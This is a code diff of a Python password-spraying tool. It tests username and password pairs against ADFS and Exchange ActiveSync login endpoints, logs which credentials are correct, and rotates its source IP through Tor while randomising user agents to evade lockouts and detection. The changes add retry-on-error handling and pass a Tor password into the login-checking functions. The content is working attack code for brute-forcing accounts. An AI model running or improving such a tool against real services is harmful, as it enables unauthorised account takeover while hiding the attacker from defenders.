@@ -43,7 +43,7 @@ def write_tested(user,password,test_credentials_file,status,ip_):
 		f.write(user+":"+password+","+status+","+current_time+","+ip_+"\n")
 
 
-def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counter,pairs, ip_):
+def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counter,pairs, ip_, tor_password):
 	if "dafs" in dafs_url:
 		origin_field  = dafs_url.split("adfs")[0]
 	else:
@@ -62,21 +62,25 @@ def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counte
 	user = credential[0]
 	password = credential[1]
 	data = {"UserName": user, "Password": password, "AuthMethod":"FormsAuthentication"}
-	resp = requests.post(dafs_url, data = data, headers = headers, verify = False, proxies = proxy)
-	if resp.history != []:
-		write_tested(user,password,test_credentials_file, "CORRECT",ip_)
-		print("[%s/%s] %s - CORRECT credentials found: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
-		return True
-	elif resp.history == []:
-		write_tested(user,password,test_credentials_file, "FAILED",ip_)
-		if debug: print("[%s/%s] %s - Incorrect credentials: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
-		return False
-	if resp.status_code != 200:
-		print ("[!] Strange status code: %s. Quitting!!!"%(resp.status_code))
-		sys.exit(1)
+	try:
+		resp = requests.post(dafs_url, data = data, headers = headers, verify = False, proxies = proxy)
+		if resp.history != []:
+			write_tested(user,password,test_credentials_file, "CORRECT",ip_)
+			print("[%s/%s] %s - CORRECT credentials found: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
+			return True
+		elif resp.history == []:
+			write_tested(user,password,test_credentials_file, "FAILED",ip_)
+			if debug: print("[%s/%s] %s - Incorrect credentials: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
+			return False
+		if resp.status_code != 200:
+			print ("[!] Strange status code: %s. Quitting!!!"%(resp.status_code))
+			sys.exit(1)
+	except:
+		if debug: print("[%s/%s] %s - Error: Probably max. retries exceeded. Retrying request"%(counter,pairs, time.strftime("%H:%M")))
+		check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counter,pairs, ip_, tor_password)
 
 
-def check_activesync_user(credential,debug,proxy,test_credentials_file,counter,pairs, ip_):
+def check_activesync_user(credential,debug,proxy,test_credentials_file,counter,pairs, ip_, tor_password):
 	user = credential[0]
 	password = credential[1]
 	s = requests.Session()
@@ -90,16 +94,20 @@ def check_activesync_user(credential,debug,proxy,test_credentials_file,counter,p
 		"Accept-Language": "en-US,en;q=0.5", 
 		"User-Agent": random_user_agent
 	}
-	response = s.get(active_sync_url, headers = headers, verify = False, proxies = proxy)
-	if debug: print("[%s/%s] %s - Response status code: %s" % (counter,pairs,time.strftime("%H:%M"),response.status_code))
-	if response.status_code == 200 or response.status_code == 505:
-		print("[%s/%s] %s - CORRECT credentials found: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
-		write_tested(user,password,test_credentials_file,"CORRECT",ip_)
-		return True
-	else:
-		if debug: print("[%s/%s] %s - Incorrect credentials: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
-		write_tested(user,password,test_credentials_file,"FAILED",ip_)
-		return False
+	try:
+		response = s.get(active_sync_url, headers = headers, verify = False, proxies = proxy)
+		if debug: print("[%s/%s] %s - Response status code: %s" % (counter,pairs,time.strftime("%H:%M"),response.status_code))
+		if response.status_code == 200 or response.status_code == 505:
+			print("[%s/%s] %s - CORRECT credentials found: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
+			write_tested(user,password,test_credentials_file,"CORRECT",ip_)
+			return True
+		else:
+			if debug: print("[%s/%s] %s - Incorrect credentials: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
+			write_tested(user,password,test_credentials_file,"FAILED",ip_)
+			return False
+	except:
+		if debug: print("[%s/%s] %s - Error: Probably max. retries exceeded. Retrying request"%(counter,pairs, time.strftime("%H:%M")))
+		check_activesync_user(credential,debug,proxy,test_credentials_file,counter,pairs, ip_, tor_password)
 
 
 def calculate_values(target):
@@ -126,13 +134,12 @@ def change_tor_ip(controller, debug):
 	try:
 		controller.signal(Signal.NEWNYM)
 		time.sleep(controller.get_newnym_wait())
+		new_ip = requests.get('https://api.ipify.org').text.replace("\n","")
+		if "Application Error" in new_ip:
+			new_ip = "Error_Getting_Ip" 
+		return new_ip
 	except:
-		print("[!] Error changing IP address using Tor")
-		pass
-	new_ip = requests.get('https://api.ipify.org').text.replace("\n","")
-	if "Application Error" in new_ip:
-		new_ip = "Error_Getting_Ip" 
-	return new_ip
+		return "Error_Getting_Ip"
 
 
 def main():
@@ -232,9 +239,9 @@ def main():
 			time.sleep(random_seconds)
 			#if debug: print("[%s/%s] Testing %s:%s"%(str(counter), str(len(pairs)),credential[0], credential[1]))
 			if dafs_url != active_sync_url:
-				correct_user = check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip)
+				correct_user = check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip, tor_password)
 			else:
-				correct_user = check_activesync_user(credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip)
+				correct_user = check_activesync_user(credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip, tor_password)
 			if correct_user:
 				correct_users_list.append(credential[0])
 				if stop_on_success:
